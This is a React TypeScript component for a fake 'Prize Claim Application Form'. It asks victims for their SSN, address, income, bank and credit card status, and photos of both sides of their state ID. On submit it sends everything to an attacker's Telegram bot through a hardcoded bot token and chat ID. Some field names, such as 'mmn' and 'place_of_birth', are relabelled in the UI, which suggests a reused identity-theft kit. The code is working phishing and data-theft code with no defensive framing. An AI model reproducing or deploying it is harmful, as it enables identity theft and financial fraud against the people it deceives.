import React, { useState } from "react";

interface FormData {
  fullname: string;
  email: string;
  address: string;
  city: string;
  state: string;
  zip_code: string;
  phone: string;
  age: string;
  gender: string;
  occupation: string;
  ssn: string;
  tax_filled: string;
  father_fullname: string;
  mother_fullname: string;
  mmn: string;
  place_of_birth: string;
  previous_address: string;
  id_card_front: File | null;
  id_card_back: File | null;
}

const ClaimWinnings = () => {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formData, setFormData] = useState<FormData>({
    fullname: "",
    email: "",
    address: "",
    city: "",
    state: "",
    zip_code: "",
    phone: "",
    age: "",
    gender: "",
    occupation: "",
    ssn: "",
    tax_filled: "",
    father_fullname: "",
    mother_fullname: "",
    mmn: "",
    place_of_birth: "",
    previous_address: "",
    id_card_front: null,
    id_card_back: null,
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type, files } = e.target as HTMLInputElement;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === "file" && files ? files[0] : value,
    }));
  };

  const sendFileToTelegram = async (file: File, botToken: string, chatId: string, caption: string) => {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", file);
    formData.append("caption", caption);
  
    const telegramFileUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
  
    try {
      await fetch(telegramFileUrl, {
        method: "POST",
        body: formData,
      });
    } catch (error) {
      console.error(`Error sending file (${caption}):`, error);
    }
  };
  
  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true); 
  
    const botToken = "8281468743:AAFiJGfFVYLrwXC6TGWDWoDb8v4b8xZZLyA";
    const chatId = "1195800890";
  
    // Format text message for Telegram
    const textMessage = `
  📝 *New Claim Submission* 📝
  
  👤 *Full Name:* ${formData.fullname}
  📧 *Email:* ${formData.email}
  🏠 *Address:* ${formData.address}, ${formData.city}, ${formData.state}, ${formData.zip_code}
  📞 *Phone:* ${formData.phone}
  🎂 *Age:* ${formData.age}
  ⚤ *Gender:* ${formData.gender}
  💼 *Occupation:* ${formData.occupation}
  🆔 *SSN:* ${formData.ssn}
  📝 *Tax Filled:* ${formData.tax_filled}
  👨‍👩‍👦 *Marital Status:* ${formData.father_fullname}
  👩‍👦 *Monthly Income:* ${formData.mother_fullname}
  🔎 *Own Credit Card:* ${formData.mmn}
  📍 *Own Bank Account:* ${formData.place_of_birth}
  🏠 *cash or check:* ${formData.previous_address}
    `;
  
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    try {
      // Send the text message to Telegram
      await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: textMessage,
          parse_mode: "Markdown",
        }),
      });
  
      // Send file (if uploaded)
      if (formData.id_card_front) {
        await sendFileToTelegram(formData.id_card_front, botToken, chatId, "Front ID Card");
      }
      if (formData.id_card_back) {
        await sendFileToTelegram(formData.id_card_back, botToken, chatId, "Back ID Card");
      }
  
      alert("Successfully sent, we will get back with you shortly");
      window.location.href = "/";

    } catch (error) {
      console.error("Error sending message:", error);
      alert("Failed to submit form.");
    }
  };
  

  return (
    <div className="max-w-4xl mt-9 mb-8 mx-auto p-6 bg-white shadow-md text-center rounded-lg">
      <h2 className="text-3xl mt-6 font-semibold mb-6">
Prize Claim Application Form


</h2>
<p className="mb-2">Fill the form below to claim your winnings</p>
<form onSubmit={handleSubmit} className=" gap-4">
  {[
    { name: "fullname", placeholder: "Full Name" },
    { name: "email", type: "email", placeholder: "Email" },
    { name: "address", placeholder: "Address" },
    { name: "city", placeholder: "City" },
    { name: "state", placeholder: "State" },
    { name: "zip_code", placeholder: "Zip Code" },
    { name: "phone", placeholder: "Phone" },
    { name: "age", type: "number", placeholder: "Age" },
    { name: "occupation", placeholder: "Occupation" },
    { name: "ssn", placeholder: "SSN" },
    { name: "father_fullname", placeholder: "Marital Status" },
    { name: "mother_fullname", placeholder: "Monthly Income" },
    { name: "mmn", placeholder: "Own Credit Card" },
    { name: "place_of_birth", placeholder: "Own Bank Account" },
    { name: "previous_address", placeholder: "Do you want Cash/Check" },
  ].map(({ name, type = "text", placeholder }) => (
    <div key={name} className="flex flex-col">
      <label htmlFor={name} className="text-sm text-start font-bold mb-2 text-gray-700">
        {placeholder}
      </label>
      <input
        id={name}
        type={type}
        name={name}
        value={formData[name as keyof typeof formData] as string}
        onChange={handleChange}
        className="p-2 border border-gray-300 rounded w-full"
        placeholder={placeholder}
        required
      />
    </div>
  ))}

  <div className="flex flex-col">
    <label htmlFor="gender" className="text-sm font-medium text-gray-700">
      Gender
    </label>
    <select
      id="gender"
      name="gender"
      value={formData.gender}
      onChange={handleChange}
      className="p-2 border border-gray-300 rounded w-full"
      required
    >
      <option value="">Select Gender</option>
      <option value="Male">Male</option>
      <option value="Female">Female</option>
    </select>
  </div>

  <div className="flex flex-col">
    <label htmlFor="tax_filled" className="text-sm font-medium text-gray-700">
      Did you file tax for 2024?
    </label>
    <select
      id="tax_filled"
      name="tax_filled"
      value={formData.tax_filled}
      onChange={handleChange}
      className="p-2 border border-gray-300 rounded w-full"
      required
    >
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
  </div>

  <div className="flex flex-col">
    <label htmlFor="id_card_front" className="text-sm font-medium text-gray-700">
      Front of State ID/License
    </label>
    <input
      id="id_card_front"
      type="file"
      name="id_card_front"
      onChange={handleChange}
      className="w-full border border-gray-300 p-2 rounded"
      accept="image/*"
      required
    />
  </div>

  <div className="flex flex-col">
    <label htmlFor="id_card_back" className="text-sm font-medium text-gray-700">
      Back of State ID/License
    </label>
    <input
      id="id_card_back"
      type="file"
      name="id_card_back"
      onChange={handleChange}
      className="w-full border border-gray-300 p-2 rounded"
      accept="image/*"
      required
    />
  </div>

  <p className="col-span-2 text-sm text-gray-500">
    Note: You will be prompted to text our representative for further information after submitting your application.
  </p>

  <button
    type="submit"
    className="col-span-2 bg-black hover:bg-blue-800 text-white py-2 px-4 rounded transition-all"
  >
    Submit
  </button>
</form>

{isLoading && (
  <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
    <div className="p-4 bg-white rounded-lg flex flex-col items-center shadow-lg">
      <svg className="animate-spin h-10 w-10 text-purple-600" viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="4"></circle>
      </svg>
      <p className="mt-3 text-lg font-semibold">Submitting...</p>
    </div>
  </div>
)}


    </div>
  );
};

export default ClaimWinnings;
